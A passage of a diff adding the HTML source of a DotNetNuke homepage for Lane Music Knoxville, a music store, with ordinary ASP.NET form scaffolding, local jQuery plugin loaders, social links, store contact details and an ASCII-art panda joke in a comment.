@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html  lang="en-US">
+<head id="Head">
+<!--************************************************************************************-->
+<!-- DNN Platform - http://www.dnnsoftware.com                                        -->
+<!-- Copyright (c) 2002-2013                                                          -->
+<!-- by DNN Corporation                                                               -->
+<!--**********************************************************************************-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge" /><title>
+	Lane Music Knoxville > Home
+</title><meta content="text/html; charset=UTF-8" http-equiv="Content-Type" /><meta content="text/javascript" http-equiv="Content-Script-Type" /><meta content="text/css" http-equiv="Content-Style-Type" /><meta id="MetaDescription" name="DESCRIPTION" content="Lane Music Knoxville" /><meta id="MetaKeywords" name="KEYWORDS" content="Lane Music, Musical Instruments, Knoxville,DotNetNuke,DNN" /><meta id="MetaCopyright" name="COPYRIGHT" content="Copyright 2017 by Lane Music, Inc" /><meta id="MetaGenerator" name="GENERATOR" content="DotNetNuke " /><meta id="MetaAuthor" name="AUTHOR" content="Lane Music Knoxville" /><meta name="RESOURCE-TYPE" content="DOCUMENT" /><meta name="DISTRIBUTION" content="GLOBAL" /><meta id="MetaRobots" name="ROBOTS" content="INDEX, FOLLOW" /><meta name="REVISIT-AFTER" content="1 DAYS" /><meta name="RATING" content="GENERAL" /><meta http-equiv="PAGE-ENTER" content="RevealTrans(Duration=0,Transition=1)" /><style id="StylePlaceholder" type="text/css"></style><link href="/portals/_default/default.css?cdv=19" type="text/css" rel="stylesheet"/><link href="/portals/_default/ie.css?cdv=19" type="text/css" rel="stylesheet"/><link href="/portals/_default/containers/ares/container.css?cdv=19" type="text/css" rel="stylesheet"/><link href="/portals/0/portal.css?cdv=19" type="text/css" rel="stylesheet"/><script src="/resources/shared/scripts/jquery/jquery.min.js?cdv=19" type="text/javascript"></script><script src="/resources/shared/scripts/jquery/jquery-migrate.min.js?cdv=19" type="text/javascript"></script><script src="/resources/shared/scripts/jquery/jquery-ui.min.js?cdv=19" type="text/javascript"></script><link rel='SHORTCUT ICON' href='/Portals/0/favicon.ico' type='image/x-icon' /><link type="text/css" rel="stylesheet" href="/DesktopModules/SpeedyTouchFlexi/flexslider.css" /><style type="text/css"></style><meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" /><!--[if lt IE 9]><script type="text/javascript" src="http://html5shiv.googlecode.com/svn/trunk/html5.js"> </script><![endif]--><script type="text/javascript" src="/Portals/_default/Skins/Ares/javascripts/modernizr.foundation.js"> </script><link type="text/css" rel="stylesheet" href="/Portals/_default/Skins/Ares/stylesheets/bootstrap.css" /><link type="text/css" rel="stylesheet" href="/Portals/_default/Skins/Ares/stylesheets/default.css" /><!--[if lt IE 9]><link type="text/css" rel="stylesheet" href="/Portals/_default/Skins/Ares/stylesheets/ie.css" /><![endif]--><link type="text/css" rel="stylesheet" href="/Portals/_default/Skins/Ares/stylesheets/customizer.css" /><link type="text/css" rel="stylesheet" href="" /><!--[if lt IE 9]><script type="text/javascript" src="/Portals/_default/Skins/Ares/javascripts/selectivizr-min.js"> </script><![endif]--><link type="text/css" rel="stylesheet" href="/Portals/_default/Skins/Ares/stylesheets/Skin.css" /><link rel="stylesheet" type="text/css" href="/Portals/_default/Skins/Ares/Superfish/superfish.css"></link></head>
+<body id="Body">
+    
+    <form method="post" action="/" id="Form" enctype="multipart/form-data">
+<div class="aspNetHidden">
+<input type="hidden" name="StylesheetManager_TSSM" id="StylesheetManager_TSSM" value="" />
+<input type="hidden" name="ScriptManager_TSM" id="ScriptManager_TSM" value="" />
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['Form'];
+if (!theForm) {
+    theForm = document.Form;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=CdnBVuVmMyctvVJXtYCBxuDxfGdbbwercDMudMMo_0-fwjM4o0Tvyd0crqf3OdpM3X4xQ5B48yXaU5Ty0&amp;t=636283832160000000" type="text/javascript"></script>
+
+<script type="text/javascript">if (!(window.jQuery && window.jQuery.fn && window.jQuery.fn.hoverIntent)) document.write(unescape('%3Cscript src="/Portals/_default/Skins/Ares/Superfish/hoverIntent.js" type="text/javascript"%3E%3C/script%3E'));</script><script type="text/javascript">if (!(window.jQuery && window.jQuery.fn && window.jQuery.fn.superfish)) document.write(unescape('%3Cscript src="/Portals/_default/Skins/Ares/Superfish/superfish.js" type="text/javascript"%3E%3C/script%3E'));</script>
+<script src="/Telerik.Web.UI.WebResource.axd?_TSM_HiddenField_=ScriptManager_TSM&amp;compress=1&amp;_TSM_CombinedScripts_=%3b%3bSystem.Web.Extensions%2c+Version%3d4.0.0.0%2c+Culture%3dneutral%2c+PublicKeyToken%3d31bf3856ad364e35%3aen-US%3abcca958d-0b33-4edf-8c7b-050821c334aa%3aea597d4b%3ab25378d2" type="text/javascript"></script>
+<script src="/js/dnn.js" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="U91255gXDetfT2/SolPpCpABbVlOImuHLEsCWhcoIrJHFDEFYuaP/AEICNG316G+WSKtONkdjNCFf1XGGAOw/Wj7mqbkUy7RoWeWt1BdDcfCDzrj7tsOFLrahdf4xeqqg1XrTWHiBWdYTbfLCrtTpF0oAxGA8oMTd9w4Nx9tG47Fx4B+W9ts0O8V5Ms=" />
+</div><script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager', 'Form', [], [], [], 90, '');
+//]]>
+</script>
+
+        <script src="/js/dnn.modalpopup.js?cdv=19" type="text/javascript"></script><script src="/js/dnn.servicesframework.js?cdv=19" type="text/javascript"></script><script src="/js/dnncore.js?cdv=19" type="text/javascript"></script>
+        
+        
+<!--
+Memphis Music, Lane Music
+Copyright (c) 2014 Lane Music, Inc.
+All Rights Reserved.
+
+
+
+                              _,add8ba,
+                            ,d888888888b,
+                           d8888888888888b                        _,ad8ba,_
+                          d888888888888888)                     ,d888888888b,
+                          I8888888888888888 _________          ,8888888888888b
+                __________`Y88888888888888P"""""""""""baaa,__ ,888888888888888,
+            ,adP"""""""""""9888888888P""^                 ^""Y8888888888888888I
+         ,a8"^           ,d888P"888P^                           ^"Y8888888888P'
+       ,a8^            ,d8888'                                     ^Y8888888P'
+      a88'           ,d8888P'                                        I88P"^
+    ,d88'           d88888P'                                          "b,
+   ,d88'           d888888'                                            `b,
+  ,d88'           d888888I                                              `b,
+  d88I           ,8888888'            ___                                `b,
+ ,888'           d8888888          ,d88888b,              ____            `b,
+ d888           ,8888888I         d88888888b,           ,d8888b,           `b
+,8888           I8888888I        d8888888888I          ,88888888b           8,
+I8888           88888888b       d88888888888'          8888888888b          8I
+d8886           888888888       Y888888888P'           Y8888888888,        ,8b
+88888b          I88888888b      `Y8888888^             `Y888888888I        d88,
+Y88888b         `888888888b,      `""""^                `Y8888888P'       d888I
+`888888b         88888888888b,                           `Y8888P^        d88888
+ Y888888b       ,8888888888888ba,_          _______        `""^        ,d888888
+ I8888888b,    ,888888888888888888ba,_     d88888888b               ,ad8888888I
+ `888888888b,  I8888888888888888888888b,    ^"Y888P"^      ____.,ad88888888888I
+  88888888888b,`888888888888888888888888b,     ""      ad888888888888888888888'
+  8888888888888698888888888888888888888888b_,ad88ba,_,d88888888888888888888888
+  88888888888888888888888888888888888888888b,`"""^ d8888888888888888888888888I
+  8888888888888888888888888888888888888888888baaad888888888888888888888888888'
+  Y8888888888888888888888888888888888888888888888888888888888888888888888888P
+  I888888888888888888888888888888888888888888888P^  ^Y8888888888888888888888'
+  `Y88888888888888888P88888888888888888888888888'     ^88888888888888888888I
+   `Y8888888888888888 `8888888888888888888888888       8888888888888888888P'
+    `Y888888888888888  `888888888888888888888888,     ,888888888888888888P'
+     `Y88888888888888b  `88888888888888888888888I     I888888888888888888'
+       "Y8888888888888b  `8888888888888888888888I     I88888888888888888'
+         "Y88888888888P   `888888888888888888888b     d8888888888888888'
+            ^""""""""^     `Y88888888888888888888,    888888888888888P'
+                             "8888888888888888888b,   Y888888888888P^
+                              `Y888888888888888888b   `Y8888888P"^
+                                "Y8888888888888888P     `""""^
+                                  `"YY88888888888P'
+                                       ^""""""""'
+                                       
+                         Frank the Panda asks, "Why are you looking at source code?"
+                                     
+                                    Frank the Panda says, "Buy a piano!"
+                                       
+                                  Frank the Panda probably talks too much.
+                                       
+                                       
+-->
+
+	
+
+ 
+
+
+
+
+
+
+
+
+
+
+<!-- START HTML FROM HERE --> 
+
+<!-- container -->
+<div id="container"CustomSection="edtPage" CustomTag="#container" UserText="Container" DisabledControls=".MainStyle, #FontColor, #BorderColor" WidthTag="#container">
+    <div class="row-fluid"><div id="dnn_SpeedyCustomizer" class="span12 Customizer spmodule DNNEmptyPane"> </div></div>
+     <div id="MainWrapper" CustomSection="edtPage" CustomTag="#MainWrapper" UserText="Main Wrapper" DisabledControls="#Transparency, #FontColor, #BorderColor, " WidthTag="#MainWrapper">
+        <div id="HeaderTopPane"CustomSection="edtPage" CustomTag="#HeaderTopPane" UserText="Header Top Pane" DisabledControls="#Transparency" WidthTag="#HeaderTopPane" >
+            <div class="row-fluid">
+                <div id="dnn_TopContact" class="span4 offset5 spmodule hide-on-phones"><div class="DnnModule DnnModule-DNN_HTML DnnModule-480"><a name="480"></a><div id="dnn_ctr480_ContentPane"><!-- Start_Module_480 --><div id="dnn_ctr480_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr480_HtmlModule_lblContent" class="Normal">
+	<ul class="Top-nav">
+    <li><strong><a href="/Home.aspx"><span style="color: #ffffff;">Home</span></a></strong><span style="color: #ffffff;">   - </span></li>
+    <li><strong><a href="#"><span style="color: #ffffff;">Account</span></a></strong> <span style="color: #ffffff;">   - </span></li>
+    <li><strong><a href="#"><span style="color: #ffffff;">Login</span></a></strong><a href="#"> </a></li>
+</ul>
+</div>
+
+</div><!-- End_Module_480 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                <div id="Localization" class="span3 mobile-centered spmodule"><div class="language-object" >
+
+
+</div></div>
+                <div id="Login" class="span5 LogIn spmodule hide-on-phones">   
+<!--close registerGroup--> </div><!--Login--><!--Login-->
+            </div>
+        </div><!--TopPaneClose-->
+        
+        
+        <div id="MainHeaderPane"CustomSection="edtPage" CustomTag="#MainHeaderPane" UserText="MainHeader Pane" DisabledControls="#Transparency, #BorderColor,#FontColor," WidthTag="#MainHeaderPane">
+             <div class="row-fluid">
+                <div id="Logo" class="span4 spmodule mobile-centered">
+                    <a id="dnn_dnnLogo_hypLogo" title="Lane Music Knoxville" href="http://www.lanemusicknoxville.com/"><img id="dnn_dnnLogo_imgLogo" src="/Portals/0/lane-logo.png" alt="Lane Music Knoxville" style="border-width:0px;" /></a><!--[if lt IE 8]><div style='clear: both; height: 112px; padding:0; position: relative;'><a href="http://www.theie7countdown.com/ie-users-info"><img src="http://www.theie7countdown.com/assets/badge_iecountdown.png" border="0" height="112" width="348" alt="" /></a></div><![endif]-->
+                </div> <!-- close logo  -->
+                <div id="HeaderRight"class="span8">
+                    <div class="row-fluid">
+                        <div id="dnn_SocialPane" class="span5 offset7 Social spmodule mobile-centered"><div class="DnnModule DnnModule-DNN_HTML DnnModule-798"><a name="798"></a><div id="dnn_ctr798_ContentPane"><!-- Start_Module_798 --><div id="dnn_ctr798_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr798_HtmlModule_lblContent" class="Normal">
+	<br />
+<div class="row-fluid hidden-phone" style="text-align: left;">
+<div class="span1">&nbsp;</div>
+<div class="span10">
+<div class="row-fluid" style="text-align: left;">
+<div class="span1">&nbsp;</div>
+<div class="span2" style="text-align: center;"><a href="https://www.facebook.com/lanemusic" target="_blank"><img alt="Click here to like Lane Music on Facebook!" src="/portals/0/facebook40.png" style="border: 0px solid;" /></a></div>
+<div class="span2" style="text-align: center;"><a href="https://www.twitter.com/lanemusicstore" target="_blank"><img alt="Click here to follow Lane Music and Memphis Music on Twitter!" src="/portals/0/twitter45.png" style="border: 0px solid;" /></a></div>
+<div class="span2" style="text-align: center;"><a href="https://plus.google.com/101699877019340733477/about" target="_blank"><img alt="Click here to visit the Lane Music page on Google+!" src="/portals/0/gplus45.png" style="border: 0px solid;" /></a></div>
+<div class="span2" style="text-align: center;"><a href="http://stores.ebay.com/Lane-Music-Store" target="_blank"><img alt="Click here to visit our Ebay store!" src="/portals/0/ebaystore.png" style="border: 0px solid;" /></a></div>
+<div class="span2" style="text-align: center;"><a href="http://www.yelp.com/biz/lane-music-germantown" target="_blank"><img alt="Click here to visit the Lane Music listing on Yelp!" src="/portals/0/yelp-icon.png" style="border: 0px solid;" /></a></div>
+<div class="span1">&nbsp;</div>
+</div>
+<div class="span1">&nbsp;</div>
+</div>
+</div>
+<p style="text-align: center;"><span style="font-size: 16px; color: #ffffff;"><strong>
+9648 Kingston Pike<br />
+Knoxville, TN 37922</strong></span><br />
+<br />
+<span style="font-size: 20px; color: #ffffff;"><strong>(865) 357-5025</strong></span></p>
+</div>
+
+</div><!-- End_Module_798 --></div>
+
+
+
+
+
+
+
+
+</div></div><!--SocialPane-->
+                        
+                        <!-- The section below is the search bar that was supposed to be in the top right corner of the page. The search bar looks pretty, but I can't get it to work properly. Do not unbracket it. There are enough navigation options on the page to suffice in lieu of the search box. -Caleb -->
+                        
+                        <!--<div id="Search" class="span5  Search spmodule "> 
+
+<div id="dnn_SEARCH1_DropDownSearch" class="SpeedySearchContainer">
+
+  <table id="SearchTable" class="RoundedContainer">
+  <tr>
+  <td id="SpeedySearchIcon">
+  <div id="SearchIcon" class="SearchIcon">
+    <img id="dnn_SEARCH1_downArrow" src="/icons/sigma/Action_16X16_Standard.png" />
+  </div>
+  </td>
+  <td id="SpeedSearchTextBox" align="center">
+  <input name="dnn$SEARCH1$txtSearchNew" type="text" maxlength="255" id="dnn_SEARCH1_txtSearchNew" class="SpeedySearchBox searchInput" onkeydown="return __dnn_KeyDown(&#39;13&#39;, &#39;javascript:__doPostBack(%27dnn$SEARCH1$cmdSearchNew%27,%27%27)&#39;, event);" />&nbsp;
+  
+   
+  <ul id="SearchChoices">
+    <li id="SearchIconSite"></li>
+    <li id="SearchIconWeb"></li>
+  </ul>
+  </td>
+  
+  <td id="SearchButton" align="center">
